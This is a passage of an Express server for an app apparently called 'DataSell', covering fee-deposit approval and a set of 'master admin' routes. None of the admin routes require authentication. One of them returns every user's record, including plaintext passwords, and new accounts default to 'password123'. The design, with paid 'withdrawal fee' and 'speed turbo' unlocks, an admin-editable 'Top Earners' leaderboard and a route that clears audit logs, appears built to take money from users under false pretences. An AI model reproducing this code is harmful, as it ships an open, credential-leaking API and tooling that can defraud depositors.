        user.hasPaidAdsActivation = true;
        user.adsActivationPending = false;
        user.adsActivationUtr = dep.utrNumber;
      } else if (isWithdrawalFee) {
        user.hasPaidWithdrawalFee = true;
        user.withdrawalFeePending = false;
        user.withdrawalFeeUtr = dep.utrNumber;
      } else if (isSpeedTurbo) {
        user.hasPaidSpeedTurbo = true;
        user.speedTurboPending = false;
        user.speedTurboUtr = dep.utrNumber;
      } else {
        user.balance = parseFloat(((parseFloat(user.balance) || 0) + dep.amount).toFixed(2));
      }
    } else if (status === 'REJECTED') {
      if (isAds) {
        user.adsActivationPending = false;
      } else if (isWithdrawalFee) {
        user.withdrawalFeePending = false;
      } else if (isSpeedTurbo) {
        user.speedTurboPending = false;
      }
    }
  }

  saveDB(db);
  res.json({ success: true, record: dep, user });
});

// ---------------- MASTER ADMIN CONTROL ROUTES ---------------- //
// "ek hi mobile se sab jitna mobile me sign up or withdrawal ho sab ek hi mobile se controll kar sake sir"

// Fetch all data for Admin Panel from any mobile
app.get('/api/admin/all-data', (req: Request, res: Response) => {
  const db = getDB();
  res.json({
    users: db.users,
    withdrawals: db.withdrawals,
    deposits: db.deposits,
    authLogs: db.authLogs,
    topEarners: db.topEarners,
    systemConfig: db.systemConfig,
    depositConfig: db.depositConfig,
    supportConfig: db.supportConfig,
    supportTickets: db.supportTickets,
  });
});

// Admin updates withdrawal (Approve or Reject with refund)
app.post('/api/admin/update-withdrawal', (req: Request, res: Response) => {
  const { id, status, bankReference, rejectionReason } = req.body;
  const db = getDB();

  const rec = db.withdrawals.find((w: any) => w.id === id);
  if (!rec) {
    return res.status(404).json({ error: 'Withdrawal record not found' });
  }

  const previousStatus = rec.status;
  rec.status = status;
  if (bankReference) rec.bankReference = bankReference;
  if (rejectionReason) rec.rejectionReason = rejectionReason;

  // If rejected from pending, refund balance back to user
  if (status === 'REJECTED' && previousStatus === 'PENDING') {
    const user = db.users.find((u: any) => u.email && u.email.toLowerCase().trim() === (rec.userEmail || '').toLowerCase().trim());
    if (user) {
      user.balance = parseFloat(((parseFloat(user.balance) || 0) + rec.amount).toFixed(2));
    }
  }

  saveDB(db);
  res.json({ success: true, record: rec });
});

// Admin updates user (Full control: Name, Email, Phone, Password, Balance, Tiers, Feature Toggles)
app.post('/api/admin/update-user', (req: Request, res: Response) => {
  const { id, email, ...updates } = req.body;
  const db = getDB();

  const searchEmail = (email || updates.email || '').toLowerCase().trim();
  let user = db.users.find((u: any) => 
    (id && u.id === id) || 
    (searchEmail && u.email && u.email.toLowerCase().trim() === searchEmail)
  );

  if (!user && searchEmail) {
    user = {
      id: id || 'usr_' + Date.now(),
      email: searchEmail,
      name: updates.name || 'User',
      phone: updates.phone || '',
      password: updates.password || 'password123',
      balance: parseFloat(updates.balance) || 0,
      totalSoldMB: parseFloat(updates.totalSoldMB) || 0,
      tier: updates.tier || 'BRONZE',
      status: updates.status || 'ACTIVE',
      savedUpiId: updates.savedUpiId || '',
      selectedPaymentMethod: updates.selectedPaymentMethod || 'PhonePe',
      signupTime: new Date().toLocaleString('en-IN'),
      lastLoginTime: new Date().toLocaleString('en-IN'),
    };
    db.users.push(user);
  } else if (!user) {
    return res.status(404).json({ error: 'User not found in database' });
  }

  if (updates.balance !== undefined) updates.balance = parseFloat(updates.balance) || 0;
  if (updates.totalSoldMB !== undefined) updates.totalSoldMB = parseFloat(updates.totalSoldMB) || 0;
  if (updates.withdrawalCount !== undefined) updates.withdrawalCount = parseInt(updates.withdrawalCount) || 0;

  Object.assign(user, updates);
  if (searchEmail) user.email = searchEmail;

  saveDB(db);
  res.json({ success: true, user });
});

// Admin manual balance credit
app.post('/api/admin/credit-user', (req: Request, res: Response) => {
  const { userId, amount, type, note } = req.body;
  const db = getDB();

  const user = db.users.find((u: any) => u.id === userId);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  const creditAmount = parseFloat(amount);
  user.balance = parseFloat((user.balance + creditAmount).toFixed(2));
  user.hasCompletedRequiredDeposit = true;

  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const dep = {
    id: 'dep_' + Date.now(),
    userId: user.id,
    userEmail: user.email,
    amount: creditAmount,
    type: type || 'ADMIN_CREDIT',
    note: note || 'Manual balance credit by Admin',
    time: now,
    status: 'COMPLETED',
    method: 'Manual',
  };

  db.deposits.unshift(dep);
  saveDB(db);
  res.json({ success: true, user, deposit: dep });
});

// Admin deletes user
app.post('/api/admin/delete-user', (req: Request, res: Response) => {
  const { userId } = req.body;
  const db = getDB();

  db.users = db.users.filter((u: any) => u.id !== userId);
  saveDB(db);
  res.json({ success: true });
});

// Admin updates system-wide selling speed, rates, and broadcast notices
app.post('/api/admin/system-config', (req: Request, res: Response) => {
  const { systemConfig, depositConfig, supportConfig } = req.body;
  const db = getDB();

  if (systemConfig) db.systemConfig = { ...db.systemConfig, ...systemConfig };
  if (depositConfig) db.depositConfig = { ...db.depositConfig, ...depositConfig };
  if (supportConfig) db.supportConfig = { ...db.supportConfig, ...supportConfig };

  saveDB(db);
  res.json({ success: true, systemConfig: db.systemConfig, depositConfig: db.depositConfig, supportConfig: db.supportConfig });
});

// Admin updates leaderboard Top Earners
app.post('/api/admin/top-earners', (req: Request, res: Response) => {
  const { topEarners } = req.body;
  const db = getDB();
  if (Array.isArray(topEarners)) {
    db.topEarners = topEarners;
    saveDB(db);
  }
  res.json({ success: true, topEarners: db.topEarners });
});

// Admin clear audit logs
app.post('/api/admin/clear-logs', (req: Request, res: Response) => {
  const db = getDB();
  db.authLogs = [];
  saveDB(db);
  res.json({ success: true });
});

// Admin sets or generates Verification Code for a user ID
app.post('/api/admin/set-verification-code', (req: Request, res: Response) => {
  const { userId, userEmail, verificationCode } = req.body;
  const db = getDB();
  const searchEmail = (userEmail || '').toLowerCase().trim();

  const user = db.users.find((u: any) => 
    (userId && u.id === userId) ||
    (searchEmail && u.email && u.email.toLowerCase().trim() === searchEmail)
  );

  if (!user) {
    return res.status(404).json({ error: 'User not found in central database' });
  }

  const code = (verificationCode || '').toString().trim().toUpperCase() || 
               'DS-' + Math.floor(100000 + Math.random() * 900000);

  user.verificationCode = code;
  saveDB(db);

  res.json({
    success: true,
    message: `Verification code for ${user.name || user.id} updated to ${code}`,
    userId: user.id,
    verificationCode: code,
    user,
  });
});

// Admin auto-generates verification codes for all users
app.post('/api/admin/generate-all-codes', (req: Request, res: Response) => {
  const db = getDB();
  let count = 0;
  for (const u of db.users) {
    u.verificationCode = 'DS-' + Math.floor(100000 + Math.random() * 900000);
    count++;
  }
  saveDB(db);
  res.json({ success: true, count, users: db.users });
});

// ---------------- VITE MIDDLEWARE / STATIC SERVING ---------------- //

async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.resolve(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (req: Request, res: Response) => {
      res.sendFile(path.resolve(distPath, 'index.html'));
    });
  }

  app.listen(Number(PORT), '0.0.0.0', () => {
    console.log(`DataSell Central Engine listening at http://0.0.0.0:${PORT}`);
  });
}

startServer();
